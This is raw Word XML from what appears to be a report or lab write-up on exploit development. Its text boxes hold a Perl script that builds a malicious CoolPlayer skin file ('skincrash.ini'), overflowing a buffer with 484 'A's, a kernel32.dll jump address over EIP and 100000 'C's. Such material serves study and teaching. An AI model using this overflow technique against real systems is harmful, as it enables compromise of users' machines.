                        <w:t>);</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="62182B3D" w14:textId="2EA44619" w:rsidR="00090631" w:rsidRPr="00CF75AD" w:rsidRDefault="00090631" w:rsidP="00090631">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>print $FILE $buffer;</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="543FAB29" w14:textId="12645883" w:rsidR="00090631" w:rsidRDefault="00090631" w:rsidP="00090631">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                      </w:pPr>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>close($FILE);</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                      <w:r w:rsidRPr="00090631">
                        <w:tab/>
                      </w:r>
                      <w:r>
                        <w:tab/>
                      </w:r>
                      <w:r>
                        <w:tab/>
                      </w:r>
                      <w:r>
                        <w:tab/>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="5F2F976D" w14:textId="482BACD6" w:rsidR="00090631" w:rsidRDefault="00090631" w:rsidP="00090631">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                      </w:pPr>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>
                <w10:wrap type="square"/>
              </v:shape>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
    </w:p>
    <w:p w14:paraId="797EAF92" w14:textId="0C2273F2" w:rsidR="005E1F6C" w:rsidRPr="005E1F6C" w:rsidRDefault="005E1F6C" w:rsidP="005E1F6C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="20C6C0CA" w14:textId="1555091D" w:rsidR="005E1F6C" w:rsidRPr="005E1F6C" w:rsidRDefault="005E1F6C" w:rsidP="005E1F6C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5678E4F4" w14:textId="730C1894" w:rsidR="005E1F6C" w:rsidRDefault="005E1F6C" w:rsidP="005E1F6C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3217D662" w14:textId="381FD7C5" w:rsidR="00CF75AD" w:rsidRDefault="00CF75AD" w:rsidP="005E1F6C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7944D0D5" w14:textId="029ED082" w:rsidR="00085E66" w:rsidRPr="00085E66" w:rsidRDefault="00CF75AD" w:rsidP="00CF75AD">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="720" w:hanging="720"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="61" w:name="_Toc103326489"/>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="45720" distB="45720" distL="114300" distR="114300" simplePos="0" relativeHeight="251685888" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="50A3EF71" wp14:editId="73A48DA0">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="column">
                  <wp:posOffset>-428625</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>360045</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="6905625" cy="1181100"/>
                <wp:effectExtent l="0" t="0" r="28575"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5625" cy="1181100"/>
                        </a:xfrm>
                        <a:prstGeom prst="rect">
                          <a:avLst/>
                        </a:prstGeom>
                        <a:solidFill>
                          <a:srgbClr val="FFFFFF"/>
                        </a:solidFill>
                        <a:ln w="9525">
                          <a:solidFill>
                            <a:srgbClr val="000000"/>
                          </a:solidFill>
                          <a:miter lim="800000"/>
                          <a:headEnd/>
                          <a:tailEnd/>
                        </a:ln>
                      </wps:spPr>
                      <wps:txbx>
                        <w:txbxContent>
                          <w:p w14:paraId="63A844D5" w14:textId="56481A3B" w:rsidR="00647250" w:rsidRPr="00CF75AD" w:rsidRDefault="00647250" w:rsidP="00647250">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t xml:space="preserve">$file1 = "skincrash.ini"; </w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:tab/>
                              <w:t>#the name of the file that will be created, must be .ini</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="49657F83" w14:textId="2A7AEF95" w:rsidR="00647250" w:rsidRPr="00CF75AD" w:rsidRDefault="00647250" w:rsidP="00647250">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>$buffer = "[CoolPlayer Skin]\</w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>nPlaylistSkin</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t xml:space="preserve">="; </w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:tab/>
                              <w:t xml:space="preserve">#include this as a header before overflowing with </w:t>
                            </w:r>
                            <w:proofErr w:type="gramStart"/>
                            <w:r w:rsidR="00AE09B1" w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>As</w:t>
                            </w:r>
                            <w:proofErr w:type="gramEnd"/>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t xml:space="preserve"> for it to be </w:t>
                            </w:r>
                            <w:r w:rsidR="00AE09B1" w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>recognized</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t xml:space="preserve"> as a skin file</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="55D9A027" w14:textId="48E263D6" w:rsidR="00647250" w:rsidRPr="00CF75AD" w:rsidRDefault="00647250" w:rsidP="00647250">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>$buffer .= "A" x 484;</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:tab/>
                              <w:t>#number of chars before EIP</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="18E1D0A9" w14:textId="76E23EAF" w:rsidR="00647250" w:rsidRPr="00CF75AD" w:rsidRDefault="00647250" w:rsidP="00647250">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t xml:space="preserve">$buffer .= pack('V',0x7C86467B); </w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:tab/>
                              <w:t>#include the jump location from kernel32.dll</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="2A0EAABA" w14:textId="19A6698D" w:rsidR="00647250" w:rsidRPr="00CF75AD" w:rsidRDefault="00647250" w:rsidP="00647250">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>$buffer .= "C" x 100</w:t>
                            </w:r>
                            <w:r w:rsidR="00730517" w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>0</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>00;</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:tab/>
                              <w:t>#append (.=) 1</w:t>
                            </w:r>
                            <w:r w:rsidR="00730517" w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>0</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t xml:space="preserve">0000 </w:t>
                            </w:r>
                            <w:r w:rsidR="00AE09B1" w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>Cs</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t xml:space="preserve"> to find the max size</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="0FB8786A" w14:textId="5DA3D988" w:rsidR="00647250" w:rsidRPr="00CF75AD" w:rsidRDefault="00647250" w:rsidP="00647250">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>open($FILE,"&gt;$file1");</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:tab/>
                              <w:t>#open or create a file with the name defined in $file1</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="32F041FE" w14:textId="17B03311" w:rsidR="00647250" w:rsidRPr="00CF75AD" w:rsidRDefault="00647250" w:rsidP="00647250">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>print $FILE $buffer;</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:tab/>
                              <w:t>#print the contents of $buffer and everything appended</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="7D8859A5" w14:textId="27233435" w:rsidR="005E6DDC" w:rsidRPr="00CF75AD" w:rsidRDefault="00647250" w:rsidP="005E6DDC">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>close($FILE);</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:tab/>
                              <w:t>#close the file</w:t>
                            </w:r>
                            <w:r w:rsidR="005E6DDC" w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                            <w:r w:rsidR="005E6DDC" w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                            <w:r w:rsidR="005E6DDC" w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                            <w:r w:rsidR="005E6DDC" w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="72E3FC55" w14:textId="77777777" w:rsidR="005E6DDC" w:rsidRDefault="005E6DDC" w:rsidP="005E6DDC">
                            <w:pPr>
                              <w:pStyle w:val="cod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A3EF71" id="_x0000_s1042" type="#_x0000_t202" style="position:absolute;left:0;text-align:left;margin-left:-33.75pt;margin-top:28.35pt;width:543.75pt;height:93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">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="63A844D5" w14:textId="56481A3B" w:rsidR="00647250" w:rsidRPr="00CF75AD" w:rsidRDefault="00647250" w:rsidP="00647250">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t xml:space="preserve">$file1 = "skincrash.ini"; </w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:tab/>
                        <w:t>#the name of the file that will be created, must be .ini</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="49657F83" w14:textId="2A7AEF95" w:rsidR="00647250" w:rsidRPr="00CF75AD" w:rsidRDefault="00647250" w:rsidP="00647250">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>$buffer = "[CoolPlayer Skin]\</w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>nPlaylistSkin</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t xml:space="preserve">="; </w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:tab/>
                        <w:t xml:space="preserve">#include this as a header before overflowing with </w:t>
                      </w:r>
                      <w:proofErr w:type="gramStart"/>
                      <w:r w:rsidR="00AE09B1" w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>As</w:t>
                      </w:r>
                      <w:proofErr w:type="gramEnd"/>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t xml:space="preserve"> for it to be </w:t>
                      </w:r>
                      <w:r w:rsidR="00AE09B1" w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>recognized</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t xml:space="preserve"> as a skin file</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="55D9A027" w14:textId="48E263D6" w:rsidR="00647250" w:rsidRPr="00CF75AD" w:rsidRDefault="00647250" w:rsidP="00647250">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>$buffer .= "A" x 484;</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:tab/>
                        <w:t>#number of chars before EIP</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="18E1D0A9" w14:textId="76E23EAF" w:rsidR="00647250" w:rsidRPr="00CF75AD" w:rsidRDefault="00647250" w:rsidP="00647250">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t xml:space="preserve">$buffer .= pack('V',0x7C86467B); </w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:tab/>
                        <w:t>#include the jump location from kernel32.dll</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="2A0EAABA" w14:textId="19A6698D" w:rsidR="00647250" w:rsidRPr="00CF75AD" w:rsidRDefault="00647250" w:rsidP="00647250">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>$buffer .= "C" x 100</w:t>
                      </w:r>
                      <w:r w:rsidR="00730517" w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>0</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>00;</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:tab/>
                        <w:t>#append (.=) 1</w:t>
                      </w:r>
                      <w:r w:rsidR="00730517" w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>0</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t xml:space="preserve">0000 </w:t>
                      </w:r>
                      <w:r w:rsidR="00AE09B1" w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>Cs</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t xml:space="preserve"> to find the max size</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="0FB8786A" w14:textId="5DA3D988" w:rsidR="00647250" w:rsidRPr="00CF75AD" w:rsidRDefault="00647250" w:rsidP="00647250">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>open($FILE,"&gt;$file1");</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
